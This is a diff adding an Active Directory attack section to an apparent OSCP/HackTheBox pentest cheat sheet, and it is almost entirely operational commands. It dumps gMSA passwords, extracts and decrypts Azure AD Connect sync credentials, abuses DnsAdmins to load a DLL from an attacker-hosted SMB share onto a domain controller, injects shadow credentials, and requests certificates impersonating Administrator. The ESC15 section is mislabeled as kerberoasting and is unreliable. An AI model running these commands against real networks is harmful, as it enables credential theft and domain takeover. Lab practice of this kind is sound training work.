@@ -859,3 +859,106 @@ ldapsearch -x -H ldap://$targetip -b "$basedn" "(servicePrincipalName=*)" sAMAcc
 # 27.3 Check DCSync Privileges (Golden Ticket Requirement)
 -------------------------------
 ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=domain)" nTSecurityDescriptor
+######################################################################
+# ADD-ON — MISSING AD COMMANDS (TJNull + LainKusanagi + HTB AD Boxes)
+######################################################################
+
+
+======================================================================
+# A1 — gMSA ENUMERATION & PASSWORD RETRIEVAL
+# (Used in HTB Sendai, Vintage, Intelligence-style chains)
+======================================================================
+
+# Enumerate all gMSA accounts
+ldapsearch -x -H ldap://$targetip -b "$basedn" \
+  "(objectClass=msDS-GroupManagedServiceAccount)" \
+  sAMAccountName msDS-ManagedPassword msDS-GroupMSAMembership
+
+# Identify who can read msDS-ManagedPassword (ACL check)
+ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=*)" nTSecurityDescriptor \
+  | grep -i "msDS-ManagedPassword"
+
+# Check if current user can read gMSA passwords directly
+netexec ldap $targetip -u $user -p "$password" --attribute msDS-ManagedPassword
+
+# Dump readable gMSA passwords safely (Base64 blob → plaintext)
+gMSADumper.py -u $user -p "$password" -d $domain
+
+
+
+======================================================================
+# A2 — AZURE AD CONNECT (AADSYNC) CREDENTIAL EXTRACTION
+# (Monteverde-style hybrid AD → DA pivot)
+======================================================================
+
+# Azure AD Connect SQL DB default locations
+#   ADSync.mdf
+#   ADSync_log.ldf
+#   (path varies by install)
+C:\Program Files\Microsoft Azure AD Sync\Data\
+C:\Program Files\Microsoft Azure Active Directory Connect\ADSync\Data\
+
+# Connect to local MSSQL instance hosting Azure AD Connect DB
+mssqlclient.py $domain/$user:"$password"@$targetip -windows-auth
+
+# Query sync configuration tables
+SELECT * FROM mms_management_agent;
+SELECT * FROM mms_server_configuration;
+
+# Extract encrypted sync credentials from table
+SELECT encrypted_configuration FROM mms_management_agent;
+
+# Decrypt Azure AD Connect sync credentials (often DA creds)
+AzureADConnectDecrypt.exe <encrypted_blob>
+
+
+
+======================================================================
+# A3 — DNSADMINS ABUSE (EXECUTION PATH — ENUM YOU ALREADY HAVE)
+# (Resolute-style DNS → SYSTEM on DC)
+======================================================================
+
+# Configure DNS plugin DLL (malicious DLL hosted on SMB share)
+dnscmd $targetip /config /serverlevelplugindll \\$attacker\share\payload.dll
+
+# Restart DNS service to load the DLL
+sc.exe \\$targetip stop dns
+sc.exe \\$targetip start dns
+
+
+
+======================================================================
+# A4 — SHADOW CREDENTIALS (KeyCredentialLink Abuse)
+# (Modern AD technique — works with WriteDACL/GenericWrite)
+======================================================================
+
+# Enumerate KeyCredentialLink for all users
+ldapsearch -x -H ldap://$targetip -b "$basedn" \
+  "(objectClass=user)" sAMAccountName keyCredentialLink
+
+# Add Shadow Credential to a target user (creates cert-based auth)
+certipy shadow -u $user -p "$password" -account $targetuser -dc-ip $targetip
+
+# Authenticate using generated certificate (targetuser.pfx)
+certipy auth -pfx targetuser.pfx -dc-ip $targetip
+
+
+
+======================================================================
+# A5 — ADCS ESC15 — TARGETED KERBEROASTING (Modern ADCS Misconfig)
+======================================================================
+
+# Detect ESC15-vulnerable certificate templates
+certipy find -u $user -p "$password" -dc-ip $targetip -vulnerable | grep -i ESC15
+
+# Request vulnerable certificate masquerading as Administrator
+certipy req -u $user -p "$password" -dc-ip $targetip \
+  -template $template -upn Administrator@$domain -out esc15.pfx
+
+# Authenticate using ESC15-derived Admin certificate
+certipy auth -pfx esc15.pfx -dc-ip $targetip
+
+
+######################################################################
+# END — EXTRA AD CONTENT FOR FULL COVERAGE (TJNull + LainKusanagi)
+######################################################################
